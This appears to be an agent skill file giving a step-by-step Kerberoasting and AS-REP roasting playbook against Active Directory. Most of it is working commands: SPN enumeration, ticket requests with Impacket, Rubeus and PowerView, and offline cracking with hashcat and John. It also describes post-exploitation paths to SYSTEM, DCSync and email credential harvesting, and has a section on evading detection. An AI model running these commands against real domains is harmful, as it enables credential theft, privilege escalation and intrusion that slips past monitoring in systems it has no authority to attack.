---
name: kerberoasting
description: Kerberoasting expert methodology — request TGS tickets for SPN-registered service accounts, extract, and crack offline. Covers enumeration, targeted attacks, AS-REP roasting, and detection evasion.
version: 1.0.0
license: Apache-2.0
---

# Kerberoasting

## Attack Surface

Any domain-joined Windows environment where service accounts have Service Principal Names (SPNs) registered. Requires: valid domain credentials (any user). Service accounts often have weak passwords set long ago and rarely rotated.

## Methodology

### Phase 1 — Enumerate SPNs

```powershell
# Native PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select-Object SamAccountName, ServicePrincipalName | Format-List

# setspn (built-in)
setspn -T domain.local -Q */*

# LDAP query
([ADSISearcher]'(&(objectClass=user)(servicePrincipalName=*))').FindAll() |
  ForEach-Object { $_.Properties['samaccountname'] }
```

Target high-value accounts: svc_sql, svc_exchange, svc_backup, svc_iis, Administrator (if SPN set).

### Phase 2 — Request TGS tickets

**Impacket (Linux):**
```bash
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.0.0.1 -request
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.0.0.1 -request -outputfile hashes.txt
```

**Rubeus (Windows, from domain-joined host):**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt  # targeted
.\Rubeus.exe kerberoast /rc4opsec  # request only RC4 tickets (avoids AES logging)
```

**PowerView:**
```powershell
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFormat HashCat | Select-Object Hash | Out-File hashes.txt
```

### Phase 3 — Offline cracking

```bash
# Hashcat — mode 13100 for RC4 (etype 23), 19600/19700 for AES
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Custom rules for service account patterns
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?d?d?d?d  # ServicePass2019 pattern

# John the Ripper
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

### Phase 4 — AS-REP Roasting (no Kerberos pre-auth accounts)

```bash
# Enumerate accounts with pre-auth disabled
impacket-GetNPUsers domain.local/ -dc-ip 10.0.0.1 -no-pass -usersfile users.txt

# Single user
impacket-GetNPUsers domain.local/target_user -dc-ip 10.0.0.1 -no-pass -format hashcat

# Crack AS-REP hash (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### Phase 5 — Post-exploitation

```powershell
# With cracked service account credentials:
# Check privileges
net user svc_sql /domain
whoami /groups (after psexec/runas)

# Common paths:
# svc_sql → SQL Server access → xp_cmdshell → SYSTEM
# svc_exchange → Exchange admin → email access → credential harvesting
# SPN on computer account → machine account compromise → DCSync if high-priv
```

## Detection Evasion

- Request only RC4 tickets (`/rc4opsec` in Rubeus) — AES requests are more suspicious in modern domains
- Spread requests over time — don't request all SPNs simultaneously
- Use legitimate tools (PowerShell ADSI) vs. offensive tooling for initial enum
- Target single high-value accounts rather than mass enumeration

## Tools

- [Rubeus](https://github.com/GhostPack/Rubeus) — Windows, in-memory
- [Impacket GetUserSPNs](https://github.com/SecureAuthCorp/impacket) — Linux/Mac
- [PowerView](https://github.com/PowerShellMafia/PowerSploit) — enumeration
- Hashcat / John the Ripper — cracking
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — identify high-value targets first

## MITRE ATT&CK Mapping

- T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
